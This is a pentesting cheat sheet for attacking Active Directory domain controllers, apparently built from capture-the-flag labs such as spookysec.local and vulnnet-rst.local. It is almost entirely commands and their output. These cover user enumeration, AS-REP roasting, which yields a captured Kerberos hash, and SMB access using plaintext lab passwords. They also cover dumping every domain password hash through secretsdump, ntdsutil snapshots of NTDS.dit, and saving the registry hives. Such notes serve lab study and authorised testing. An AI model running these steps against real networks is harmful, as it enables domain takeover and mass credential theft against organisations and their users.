# Domain Controllers

## Basics

* Find the NETBIOS Domain Name

```
nbtscan -v 10.10.8.1-254
```

* Should also be in nmap output

```
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   DNS_Tree_Name: spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-08-20T18:00:52+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
```

* Add to `/etc/hosts`

## Kerbrute

* Find valid users
* Example Syntax

```
kerbrute -users userlist.txt -domain spookysec.local -dc-ip 10.10.55.114
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] Valid user => james
[*] Valid user => svc-admin [NOT PREAUTH]
[*] Valid user => James
[*] Valid user => robin
[*] Blocked/Disabled user => guest
[*] Valid user => darkstar
```

## Impacket

* Location:

```
/usr/share/doc/python3-impacket/examples/
```

* If we have IPC$ access without authentication we are able to list the domain users as anonymous

```
python3 lookupsid.py anonymous@10.10.10.10 | tee users.txt
```

* Isolate the users with `SidTypeUser`

```
grep SidTypeUser users.txt | awk '{print $2}' | cut -d "\\" -f2 > users.txt
```

* Now, let’s use `GetNPUsers.py` to find users without Kerberos pre-authentication:

```
python3 GetNPUsers.py vulnnet-rst.local/ -no-pass -userfile usernames.txt
```

* Should retrive a hash if the command is sucessful

```
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:692e76f70a8772c46ed94e73130460c8$713b0693498fdaff68642d78e713ca965e5007d5d864ca727289930783fe28f00bf79fef8126c4722d09cafc72ec60e940d31297591f67ce049030cb531ddd9c83cd37796fbf414b830a7c90fe26d2c45d6f2b624cd4413c58e3dbb77519dd69906248f8db27b1974b880a826003e562e25d9de9e4cb7cfa85c1de954761053b7d51a455530001348b46909f91f4e80bae7374071339f0920bb3e2ad95169d20f05d0cd586882facb63c058072dacb7ec8ddbcd9297331e1f6fb6d844ea7967659bee38fde4431af9f9608e9adcb38cb6e20e72bcf61c524f480b5ea2530e16dbeed2272855a61a05c03e84653aa1a3bbbd5ece06633
```

* Crack the hash with `john`

### SMB Samba authenticated access

```
smbclient -U vulnnet-rst.local/t-skid //10.10.100.15/NETLOGON
smbmap -u svc-admin -p management2005 -H 10.10.248.93
smbclient -U spookysec.local/svc-admin \\\\10.10.248.93\\backup 
```

* Cat out files with `smb`

```
Enter VULNNET-RST.LOCAL\t-skid's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Mar 17 00:15:49 2021
  ..                                  D        0  Wed Mar 17 00:15:49 2021
  ResetPassword.vbs                   A     2821  Wed Mar 17 00:18:14 2021

        8540159 blocks of size 4096. 4318542 blocks available
smb: \> get ResetPassword.vbs -
```



### Dump hashes

* Use `secretsdump.py` with impacket
* This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer.
* Creds used need to be domain admin for this to work

```
python3 secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.100.15
python3 secretsdump.py spookysec.local/backup:backup2517860@10.10.248.93
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

![spooky](https://user-images.githubusercontent.com/75596877/130284812-511a8141-5917-4954-8c29-e623c1edce36.png)

#### Alt Method

* Open `cmd.exe`
* Run `ntdsutil` from the command prompt, enter these commands

```
snapshot
activate instance NTDS
create
```

* Takes a snapshot of the DC
* Will show you the UUID of the newly created snapshot.
* ntdsutil is using Volume Shadow Copy for the snapshot creation, but also ensures the database consistency. Use the UUID for the following command:

```
mount <UUID>
```

* The output will show the path where the snapshot was mounted. Start another cmd.exe as Administrator and copy NTDS.dit (located in `Windows\NTDS\NTDS.dit` by default).
* Create a copy of the `SYSTEM` registry hive:

```
reg.exe save HKLM\SYSTEM <path_where_you_want_to_save_it>
```

* Go back to the `cmd.exe` window with `ntdsutil` running, and `unmount` (and optionally `delete`) the snapshot and exit:

```
unmount <UUID>
delete <UUID>
quit
quit
```

* Using the two saved files (`NTDS.dit` and `SYSTEM` registry hive) you can use the same `secretsdump.py` script to extract password hashes offline (doesn’t need to be done on the domain controller):

```
secretsdump.py -system <path_to_system_hive> -ntds <path_to_ntds.dit> LOCAL
```

#### Secretsdump Local

* Exfil the registry hives

```
reg.exe save hklm\security C:\temp\security.save
reg.exe save hklm\system C:\temp\system.save
reg.exe save hklm\SAM C:\temp\sam.save
```

* Extract hashes from exfiled SECURITY SAM and SYSTEM

```
python3 secretsdump.py -security security.save -system system.save -sam sam.save LOCAL
```

#### Another Cheatsheet

* https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

### Invoke-ShareFinder

```
Invoke-ShareFinder  -Verbose
VERBOSE: [*] Running Invoke-ShareFinder with delay of 0
VERBOSE: [*] Querying domain rastalabs.local for hosts
VERBOSE: Get-DomainSearcher search string: LDAP://dc01.rastalabs.local/DC=rastalabs,DC=local
VERBOSE: Get-NetComputer filter : '(&(sAMAccountType=805306369)(dnshostname=*))'
VERBOSE: [*] Total number of hosts: 12
VERBOSE: Waiting for scanning threads to finish...
VERBOSE: All threads completed!
VERBOSE: [*] Total number of active hosts: 12
VERBOSE: [*] Enumerating server dc01.rastalabs.local (1 of 12)
\\dc01.rastalabs.local\ADMIN$   - Remote Admin
\\dc01.rastalabs.local\C$       - Default share
\\dc01.rastalabs.local\IPC$     - Remote IPC
\\dc01.rastalabs.local\NETLOGON         - Logon server share 
--snip--
```
